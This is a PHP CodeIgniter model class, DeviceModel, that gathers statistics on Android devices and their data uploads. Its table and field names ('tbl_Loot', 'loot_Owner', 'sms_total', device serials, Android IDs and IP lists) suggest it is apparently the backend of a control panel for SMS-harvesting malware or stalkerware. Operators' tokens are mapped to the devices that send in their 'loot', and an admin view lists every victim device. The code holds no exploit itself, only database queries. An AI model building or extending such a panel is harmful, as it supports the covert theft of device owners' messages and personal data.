<?php

namespace App\Models;

use CodeIgniter\Model;
use App\Models\UploadModel;

class DeviceModel extends Model
{
    protected $table            = 'tbl_Devices';
    protected $primaryKey       = 'id';
    protected $useAutoIncrement = true;
    protected $returnType       = 'object';
    protected $allowedFields    = [
        'device_Uuid', 'device_user_id', 'device_ip', 'device_Device', 'device_Created_At',
        'device_Product', 'device_Bootloader', 'device_Type', 'device_Tags', 'device_Host',
        'device_Display', 'device_Hardware', 'device_Fingerprint', 'device_Manufacturer',
        'device_Brand', 'device_Board', 'device_User', 'device_Model', 'device_Time',
        'device_Serial', 'device_AndroidId', 'device_AppCertHash', 'device_AppVersion',
        'device_FirstInstallTime', 'device_LastUpdateTime', 'device_Sensors',
        'device_ScreenWidth', 'device_ScreenHeight', 'device_DensityDpi', 'device_Xdpi',
        'device_Ydpi', 'device_Locale', 'device_Timezone', 'device_CpuCount', 'device_Abis',
        'device_StorageTotal', 'device_StorageAvailable', 'device_BatteryCapacity',
    ];

    /**
     * Every device linked to a user. A device is considered the user's when:
     *   1. tbl_Devices.device_user_id matches, OR
     *   2. it uploaded data stamped with loot_user_id, OR
     *   3. its uploads were made with one of the user's access tokens
     *      (raw token matches auth_identities or a tbl_User_Devices link).
     */
    public function getUserDevices(int $userId): array
    {
        $uuids = $this->getUserDeviceUuids($userId);
        if (empty($uuids)) {
            return [];
        }

        $placeholders = implode(',', array_fill(0, count($uuids), '?'));
        $rows = $this->db->query("
            SELECT
                u.device_Uuid,
                MAX(d.device_Model) AS device_Model,
                MAX(d.device_Brand) AS device_Brand,
                MAX(d.device_AndroidId) AS device_AndroidId,
                MAX(d.device_AppVersion) AS device_AppVersion,
                MAX(d.device_Fingerprint) AS device_Fingerprint,
                MAX(d.device_FirstInstallTime) AS device_FirstInstallTime,
                MAX(d.device_LastUpdateTime) AS device_LastUpdateTime,
                MAX(d.device_Created_At) AS device_Created_At,
                MAX(d.device_ip) AS device_ip,
                COUNT(l.loot_Id) AS upload_count,
                MIN(COALESCE(CASE WHEN l.loot_Created >= '2000-01-01' THEN l.loot_Created ELSE NULL END, ls.loot_Created, l.loot_Created)) AS first_upload,
                MAX(COALESCE(CASE WHEN l.loot_Created >= '2000-01-01' THEN l.loot_Created ELSE NULL END, ls.loot_Created, l.loot_Created)) AS last_upload
            FROM (
                SELECT device_Uuid FROM tbl_Devices WHERE device_Uuid IN ({$placeholders})
                UNION
                SELECT loot_Device AS device_Uuid FROM tbl_Loot WHERE loot_Device IN ({$placeholders})
            ) u
            LEFT JOIN tbl_Devices d ON d.device_Uuid = u.device_Uuid
            LEFT JOIN tbl_Loot l ON l.loot_Device = u.device_Uuid
            LEFT JOIN tbl_Loot_Summary ls ON ls.loot_Uuid = l.loot_Uuid
            GROUP BY u.device_Uuid
            ORDER BY last_upload DESC
        ", array_merge($uuids, $uuids))->getResultObject();

        $ips = $this->getDeviceIps($userId);

        foreach ($rows as $row) {
            $row->ips = $ips[$row->device_Uuid] ?? $row->device_ip ?? null;
        }

        return $rows;
    }

    /**
     * All raw access tokens that belong to a user (owned via auth_identities
     * or linked via tbl_User_Devices).
     */
    public function getUserRawTokens(int $userId): array
    {
        $modUploads = new UploadModel();
        $tokens     = $modUploads->getOwnedRawTokens($userId);

        $linked = $this->db->table('tbl_User_Devices')->where('user_id', $userId)->get()->getResultArray();
        foreach ($linked as $ld) {
            if (!empty($ld['device_token'])) $tokens[] = $ld['device_token'];
        }

        return array_values(array_unique(array_filter($tokens)));
    }

    /**
     * The distinct device UUIDs that belong to a user.
     */
    public function getUserDeviceUuids(int $userId): array
    {
        $tokens = $this->getUserRawTokens($userId);

        $params = [$userId, $userId];
        $sql = "
            SELECT device_Uuid AS uuid FROM tbl_Devices WHERE device_user_id = ?
            UNION
            SELECT loot_Device AS uuid FROM tbl_Loot WHERE loot_user_id = ?
        ";
        if (!empty($tokens)) {
            $placeholders = implode(',', array_fill(0, count($tokens), '?'));
            $sql .= " UNION SELECT loot_Device AS uuid FROM tbl_Loot WHERE loot_Owner IN ({$placeholders})";
            array_push($params, ...$tokens);
        }

        $rows = $this->db->query($sql, $params)->getResultObject();

        return array_map(static fn ($r) => $r->uuid, $rows);
    }

    /**
     * Comma-separated distinct IPs per device. When $userId is null the
     * lookup is global (admin view).
     */
    public function getDeviceIps(?int $userId = null, ?string $deviceUuid = null): array
    {
        if ($userId !== null) {
            $uuids = $this->getUserDeviceUuids($userId);
            if ($deviceUuid !== null) {
                $uuids = array_values(array_filter($uuids, static fn ($u) => $u === $deviceUuid));
            }
            if (empty($uuids)) {
                return [];
            }

            $placeholders = implode(',', array_fill(0, count($uuids), '?'));
            $rows = $this->db->query("
                SELECT l.loot_Device AS device_Uuid,
                       GROUP_CONCAT(DISTINCT l.loot_ip ORDER BY l.loot_ip SEPARATOR ', ') AS ips
                FROM tbl_Loot l
                WHERE l.loot_Device IN ({$placeholders})
                  AND l.loot_ip IS NOT NULL AND l.loot_ip <> ''
                GROUP BY l.loot_Device
            ", $uuids)->getResultObject();
        } else {
            $where  = '1 = 1';
            $params = [];
            if ($deviceUuid !== null) {
                $where    = 'l.loot_Device = ?';
                $params[] = $deviceUuid;
            }

            $rows = $this->db->query("
                SELECT l.loot_Device AS device_Uuid,
                       GROUP_CONCAT(DISTINCT l.loot_ip ORDER BY l.loot_ip SEPARATOR ', ') AS ips
                FROM tbl_Loot l
                WHERE {$where}
                  AND l.loot_ip IS NOT NULL AND l.loot_ip <> ''
                GROUP BY l.loot_Device
            ", $params)->getResultObject();
        }

        $map = [];
        foreach ($rows as $r) {
            $map[$r->device_Uuid] = $r->ips;
        }

        return $map;
    }

    /**
     * Full metrics for one device. When $userId is null the ownership
     * check is skipped (admin view).
     */
    public function getDeviceMetrics(?int $userId, string $deviceUuid): ?array
    {
        $db = $this->db;

        if ($userId !== null) {
            if (!in_array($deviceUuid, $this->getUserDeviceUuids($userId), true)) {
                return null;
            }
        }

        $device = $db->table('tbl_Devices')->where('device_Uuid', $deviceUuid)->get()->getRow();

        $stats = $db->query("
            SELECT
                COUNT(l.loot_Id) AS upload_count,
                MIN(COALESCE(CASE WHEN l.loot_Created >= '2000-01-01' THEN l.loot_Created ELSE NULL END, ls.loot_Created, l.loot_Created)) AS first_upload,
                MAX(COALESCE(CASE WHEN l.loot_Created >= '2000-01-01' THEN l.loot_Created ELSE NULL END, ls.loot_Created, l.loot_Created)) AS last_upload,
                COALESCE(SUM(ls.info_All), 0) AS sms_total
            FROM tbl_Loot l
            LEFT JOIN tbl_Loot_Summary ls ON ls.loot_Uuid = l.loot_Uuid
            WHERE l.loot_Device = ?
        ", [$deviceUuid])->getRow();

        $tokens = $db->query("
            SELECT DISTINCT l.loot_Owner AS tk
            FROM tbl_Loot l
            WHERE l.loot_Device = ?
        ", [$deviceUuid])->getResultObject();

        $maskedTokens = [];
        foreach ($tokens as $t) {
            if (!empty($t->tk)) $maskedTokens[] = $this->maskToken($t->tk);
        }

        $ownerScope = $userId !== null ? ' AND user_id = ?' : '';
        $params = [$deviceUuid];
        if ($userId !== null) $params[] = $userId;

        $activity = $db->query("
            SELECT COUNT(*) AS cnt, MAX(created_at) AS last_at
            FROM tbl_Audit_Log
            WHERE metadata LIKE ?{$ownerScope}
        ", $params)->getRow();

        return [
            'device'         => $device,
            'upload_count'   => (int) $stats->upload_count,
            'first_upload'   => $stats->first_upload,
            'last_upload'    => $stats->last_upload,
            'sms_total'      => (int) $stats->sms_total,
            'tokens'         => $maskedTokens,
            'activity_count' => (int) ($activity->cnt ?? 0),
            'last_activity'  => $activity->last_at ?? null,
            'ips'            => ($this->getDeviceIps($userId, $deviceUuid)[$deviceUuid] ?? null)
                ?: ($device->device_ip ?? null),
        ];
    }

    /**
     * Token usage breakdown for a user's owned/linked access tokens.
     */
    public function getTokenUsage(int $userId): array
    {
        $rawTokens = $this->getUserRawTokens($userId);
        if (empty($rawTokens)) {
            return [];
        }

        $usage = [];
        foreach ($rawTokens as $raw) {
            $hash = hash('sha256', $raw);

            $identity = $this->db->query("
                SELECT i.created_at, i.last_used_at, i.name
                FROM auth_identities i
                WHERE i.type = ? AND i.secret = ?
            ", [\CodeIgniter\Shield\Authentication\Authenticators\AccessTokens::ID_TYPE_ACCESS_TOKEN, $hash])->getRow();

            $uploadStats = $this->db->query("
                SELECT COUNT(*) AS cnt, MIN(loot_Created) AS first_upload, MAX(loot_Created) AS last_upload
                FROM tbl_Loot WHERE loot_Owner = ?
            ", [$raw])->getRow();

            $deviceRow = $this->db->query("
                SELECT d.device_Model, d.device_Brand
                FROM tbl_Loot l
                JOIN tbl_Devices d ON d.device_Uuid = l.loot_Device
                WHERE l.loot_Owner = ?
                ORDER BY l.loot_Id DESC LIMIT 1
            ", [$raw])->getRow();

            $usage[] = [
                'masked_token'  => $this->maskToken($raw),
                'token_hash'    => $hash,
                'created_at'    => $identity->created_at ?? null,
                'last_used_at'  => $identity->last_used_at ?? null,
                'name'          => $identity->name ?? null,
                'upload_count'  => (int) ($uploadStats->cnt ?? 0),
                'first_upload'  => $uploadStats->first_upload ?? null,
                'last_upload'   => $uploadStats->last_upload ?? null,
                'device_model'  => trim(($deviceRow->device_Model ?? '') . ' ' . ($deviceRow->device_Brand ?? '')),
            ];
        }

        usort($usage, static fn ($a, $b) => strcmp(
            $b['last_used_at'] ?? $b['created_at'] ?? '',
            $a['last_used_at'] ?? $a['created_at'] ?? ''
        ));

        return $usage;
    }

    /**
     * API activity (audit log) for a user.
     */
    public function getApiActivity(int $userId, int $limit = 25): array
    {
        $db = $this->db;

        if (! $db->tableExists('tbl_Audit_Log')) {
            return [
                'actions' => [],
                'feed'    => [],
                'totals'  => (object) ['total_calls' => 0, 'last_24h' => 0, 'last_7d' => 0, 'unique_ips' => 0],
            ];
        }

        $actions = $db->query("
            SELECT action, COUNT(*) AS cnt
            FROM tbl_Audit_Log
            WHERE user_id = ?
            GROUP BY action
            ORDER BY cnt DESC
        ", [$userId])->getResultArray();

        $feed = $db->query("
            SELECT id, action, action_category, description, ip, user_agent, metadata, created_at
            FROM tbl_Audit_Log
            WHERE user_id = ?
            ORDER BY id DESC
            LIMIT ?
        ", [$userId, $limit])->getResultArray();

        $totals = $db->query("
            SELECT
                COUNT(*) AS total_calls,
                SUM(CASE WHEN created_at >= ? THEN 1 ELSE 0 END) AS last_24h,
                SUM(CASE WHEN created_at >= ? THEN 1 ELSE 0 END) AS last_7d,
                COUNT(DISTINCT ip) AS unique_ips
            FROM tbl_Audit_Log
            WHERE user_id = ?
        ", [date('Y-m-d H:i:s', strtotime('-1 day')), date('Y-m-d H:i:s', strtotime('-7 days')), $userId])->getRow();

        return ['actions' => $actions, 'feed' => $feed, 'totals' => $totals];
    }

    /**
     * Admin view: every device across all users (including orphan uploads
     * that have no tbl_Devices row yet).
     */
    public function getAllDevices(): array
    {
        $devices = $this->db->query("
            SELECT
                d.device_Uuid,
                MAX(d.device_Model) AS device_Model,
                MAX(d.device_Brand) AS device_Brand,
                MAX(d.device_AndroidId) AS device_AndroidId,
                MAX(d.device_AppVersion) AS device_AppVersion,
                MAX(d.device_Fingerprint) AS device_Fingerprint,
                MAX(d.device_FirstInstallTime) AS device_FirstInstallTime,
                MAX(d.device_LastUpdateTime) AS device_LastUpdateTime,
                MAX(d.device_Created_At) AS device_Created_At,
                MAX(d.device_ip) AS device_ip,
                MAX(d.device_user_id) AS device_user_id,
                MAX(u.username) AS username,
                MAX(ai.secret) AS email,
                COUNT(l.loot_Id) AS upload_count,
                MIN(COALESCE(CASE WHEN l.loot_Created >= '2000-01-01' THEN l.loot_Created ELSE NULL END, ls.loot_Created, l.loot_Created)) AS first_upload,
                MAX(COALESCE(CASE WHEN l.loot_Created >= '2000-01-01' THEN l.loot_Created ELSE NULL END, ls.loot_Created, l.loot_Created)) AS last_upload
            FROM tbl_Devices d
            LEFT JOIN users u ON u.id = d.device_user_id
            LEFT JOIN auth_identities ai ON ai.user_id = d.device_user_id AND ai.type = 'email_password'
            LEFT JOIN tbl_Loot l ON l.loot_Device = d.device_Uuid
            LEFT JOIN tbl_Loot_Summary ls ON ls.loot_Uuid = l.loot_Uuid
            GROUP BY d.device_Uuid
            ORDER BY last_upload DESC
        ")->getResultObject();

        $orphans = $this->db->query("
            SELECT
                l.loot_Device AS device_Uuid,
                MAX(u.username) AS username,
                MAX(ai.secret) AS email,
                MAX(l.loot_user_id) AS device_user_id,
                COUNT(*) AS upload_count,
                MIN(COALESCE(CASE WHEN l.loot_Created >= '2000-01-01' THEN l.loot_Created ELSE NULL END, ls.loot_Created, l.loot_Created)) AS first_upload,
                MAX(COALESCE(CASE WHEN l.loot_Created >= '2000-01-01' THEN l.loot_Created ELSE NULL END, ls.loot_Created, l.loot_Created)) AS last_upload
            FROM tbl_Loot l
            LEFT JOIN tbl_Loot_Summary ls ON ls.loot_Uuid = l.loot_Uuid
            LEFT JOIN users u ON u.id = l.loot_user_id
            LEFT JOIN auth_identities ai ON ai.user_id = l.loot_user_id AND ai.type = 'email_password'
            LEFT JOIN tbl_Devices d ON d.device_Uuid = l.loot_Device
            WHERE d.device_Uuid IS NULL
            GROUP BY l.loot_Device
        ")->getResultObject();

        return ['devices' => $devices, 'orphans' => $orphans];
    }

    /**
     * Mask a raw access token for display, e.g. abcd****…****wxyz.
     */
    public function maskToken(string $raw): string
    {
        if (strlen($raw) <= 8) {
            return str_repeat('*', strlen($raw));
        }
        return substr($raw, 0, 4) . str_repeat('*', strlen($raw) - 8) . substr($raw, -4);
    }
}
